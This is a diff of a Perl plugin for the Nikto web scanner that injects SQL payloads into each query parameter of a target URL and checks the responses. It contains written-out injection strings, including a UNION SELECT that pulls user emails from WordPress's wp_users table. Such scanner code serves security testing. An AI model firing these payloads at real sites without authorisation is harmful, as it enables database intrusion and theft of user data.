@@ -34,49 +34,39 @@ sub nikto_sql_injector_init {
 
 sub nikto_sql_injector {
 	use URI;
-	use URI::Escape;
-	use URI::Split qw(uri_split uri_join);	
     use URI::QueryParam;
-    
+   
 
     my ($mark, $parameters) = @_;
     my ($found, @urls,);
     my (%flags, %files);
 
     # these are examples from my 'classification section'
-    $sql_injections{'tautology'} = "' OR 1=1; -- ";
-    $sql_injections{'illegal'} = "' OR 2=9;  -- ";
-    $sql_injections{'union'} = "' UNION ALL SELECT user_email from wp_users; --";
-    $sql_injections{'piggy'} = "'; select user_email from wp_users; --";
+    $sql_injections{'tautology'} = "'+AND+1=1";
+    $sql_injections{'illegal'} = "'+AND+2=9";
+    $sql_injections{'union'} = "'+UNION+ALL+SELECT+user_email+from+wp_users";
+    $sql_injections{'piggy'} = "';+select+user_email+from+wp_users";
 
     $flags{'nohost'} = 1;
 
-    #this identifies the original url
-    #$urls{ $mark->{'ident'} } = 1;
-    
-    #split our ident (this contains the url with the query)
-    ($scheme, $auth, $path, $query, $frag) = uri_split($parameters->{'url'});
-    
+   
     # process the queries, re-making them with injecions
-    foreach my $data (values %sql_injections) {
-    	# url encode the injection string
-        my $injection = uri_escape($data);
-    	
+    foreach my $injection (values %sql_injections) {
+
+        
     	# create another object with the original url
 		my $uri = URI->new( $parameters->{'url'} );
 		
 		#loop and replace each query with the injected version
 		foreach my $key ($uri->query_param) {
-			# make our injected query value
-            $injected_value = $uri->query_param($key) . $injection;
-            
+			
             #clone the original uri
             $new_uri = $uri->clone;
             #update the parameter with the new injected version
-            $new_uri->query_param($key, $injected_value);
+            $new_uri->query_param($key, $injection);
 		     
 	        # store it as the key in the url array
-	        $urls{ $new_uri->query } = 1;
+	        $urls{ "?".$new_uri->query } = 1;
 		}
 
     }
@@ -88,7 +78,7 @@ sub nikto_sql_injector {
         return if $mark->{'terminate'};
 
         # request by hostname
-        my ($res, $content, $error, $request, $response) = nfetch($mark, "$item", "GET", "", "", "", "sql_injector");
+        my ($res, $content, $error, $request, $response) = nfetch($mark, $item, "GET", "", "", "", "sql_injector");
 
         if (($res == 200) 
             && (!is_404($item, $content, $res, $response->{'location'})) 
